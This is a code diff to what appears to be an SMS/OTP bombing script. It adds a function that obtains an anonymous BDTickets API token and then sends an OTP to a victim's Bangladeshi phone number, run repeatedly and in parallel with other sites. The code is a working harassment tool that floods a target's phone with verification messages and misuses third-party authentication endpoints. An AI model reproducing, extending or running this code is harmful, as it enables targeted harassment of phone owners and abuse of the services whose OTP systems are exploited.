@@ -37,6 +37,53 @@ const sites = [
   },
 ];
 
+async function sendBDTickets(phone) {
+  const http = require('http');
+  const https = require('https');
+
+  const post = (url, data, headers = {}) => new Promise((resolve, reject) => {
+    const u = new URL(url);
+    const mod = u.protocol === 'https:' ? https : http;
+    const body = JSON.stringify(data);
+    const req = mod.request(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', ...headers },
+    }, (res) => {
+      let d = '';
+      res.on('data', c => d += c);
+      res.on('end', () => resolve({ status: res.statusCode, body: d }));
+    });
+    req.on('error', reject);
+    req.write(body);
+    req.end();
+  });
+
+  try {
+    const deviceId = `${Date.now()}-${Math.random().toString(36).slice(2)}`;
+    const tokenRes = await post('https://apiv1.bdtickets.com/api/v1/auth/anonymous', {
+      device_id: deviceId, device_type: 'desktop',
+    });
+    const token = (JSON.parse(tokenRes.body).access_token || '').toString();
+    if (!token) return { name: 'BDTickets', status: 'FAILED', error: 'no token' };
+
+    const formatted = `+880${phone.slice(-10)}`;
+    const otpRes = await post('https://apiv1.bdtickets.com/api/v1/auth/otp/send', {
+      phone: formatted,
+    }, {
+      Authorization: `Bearer ${token}`,
+      'x-platform': 'web',
+      'x-channel': 'direct',
+    });
+
+    if (otpRes.status >= 200 && otpRes.status < 300) {
+      return { name: 'BDTickets', status: 'DONE' };
+    }
+    return { name: 'BDTickets', status: 'FAILED', error: `HTTP ${otpRes.status}` };
+  } catch (err) {
+    return { name: 'BDTickets', status: 'FAILED', error: err.message.split('\n')[0] };
+  }
+}
+
 const args = process.argv.slice(2);
 const phone = args[0] || process.env.PHONE;
 const count = parseInt(args[1] || process.env.COUNT || "1");
@@ -79,9 +126,10 @@ async function runSite(browser, site, phone) {
 
   for (let i = 0; i < count; i++) {
     console.log(`[${i + 1}/${count}]`);
-    const results = await Promise.allSettled(
-      sites.map((site) => runSite(browser, site, phone))
-    );
+    const results = await Promise.allSettled([
+      ...sites.map((site) => runSite(browser, site, phone)),
+      sendBDTickets(phone),
+    ]);
     for (const r of results) {
       const v = r.value || {};
       console.log(`  [${v.name}] ${v.status}${v.error ? " - " + v.error : ""}`);
